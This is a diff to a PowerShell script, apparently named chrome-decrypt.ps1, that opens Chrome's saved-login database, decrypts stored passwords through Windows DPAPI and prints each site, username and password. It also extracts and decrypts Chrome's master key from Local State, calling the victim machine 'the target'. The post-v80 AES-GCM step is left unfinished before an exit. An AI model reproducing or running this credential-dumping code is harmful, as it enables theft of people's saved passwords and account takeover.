@@ -1,7 +1,11 @@
-# Assuming Win 10 with Chrome and PowerShell 5.1+ installed, dump the saved
-# passwords...
+# Assuming Win 10 with Chrome and PowerShell 5.1 installed, print out the
+# saved passwords created before Chrome v80 was installed.
+#
+# Launch recommendation:
+#
+#   pwsh .\chrome-decrypt.ps1
+# 
 $dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
-$localStatePath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Local State"
 $query = "SELECT origin_url, username_value, password_value FROM logins"
 
 Add-Type -AssemblyName System.Security
@@ -55,25 +59,6 @@ Add-Type @"
     }
 "@
 
-$localStateData = Get-Content -Raw $localStatePath
-
-# This is insane, but ConvertFrom-Json doesn't work with this file in PS 5.1.
-$keyBase64 = (($localStateData -Split 'encrypted_key":"')[1] -split '"')[0]
-$keyBytes = [System.Convert]::FromBase64String($keyBase64)
-$keyBytes = $keyBytes[5..($keyBytes.length-1)]  # Remove 'DPAPI' from start
-$keyDecoded = [System.Security.Cryptography.ProtectedData]::Unprotect(
-    $keyBytes,
-    $null,
-    [Security.Cryptography.DataProtectionScope]::CurrentUser
-)
-
-Write-Host $keyDecoded
-
-
-Write-Host $key
-
-exit
-
 $dbH = 0
 if([WinSQLite3]::Open($dataPath, [ref] $dbH) -ne 0) {
     Write-Host "Failed to open!"
@@ -96,8 +81,6 @@ while([WinSQLite3]::Step($stmt) -eq 100) {
 
     try {
 
-        # Passwords created before installing Chrome v80, decrypted using
-        # DPAPI.
         $p = [System.Text.Encoding]::ASCII.GetString(
             [System.Security.Cryptography.ProtectedData]::Unprotect(
                 [WinSQLite3]::ColumnByteArray($stmt, 2),
@@ -107,8 +90,31 @@ while([WinSQLite3]::Step($stmt) -eq 100) {
         )
 
     } catch [System.Security.Cryptography.CryptographicException] {
+        # Strange no-consequence exception bubbled up and we can safely ignore
+        # it.
     }
-
 
     Write-Host "$url,$u,$p"
 }
+
+# If the target has PowerShell 7.x installed, passwords created in Chrome
+# after v80 was installed can also be decoded.
+$localStatePath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Local State"
+$localStateData = Get-Content -Raw $localStatePath
+
+# This is insane, but ConvertFrom-Json doesn't work with this file in PS 5.1.
+$keyBase64 = (($localStateData -Split 'encrypted_key":"')[1] -split '"')[0]
+$keyBytes = [System.Convert]::FromBase64String($keyBase64)
+$keyBytes = $keyBytes[5..($keyBytes.length-1)]  # Remove 'DPAPI' from start
+$keyDecoded = [System.Security.Cryptography.ProtectedData]::Unprotect(
+    $keyBytes,
+    $null,
+    [Security.Cryptography.DataProtectionScope]::CurrentUser
+)
+
+Write-Host $keyDecoded
+
+$decoder = [Security.Cryptography.AesGcm]::new($keyDecoded)
+
+
+exit
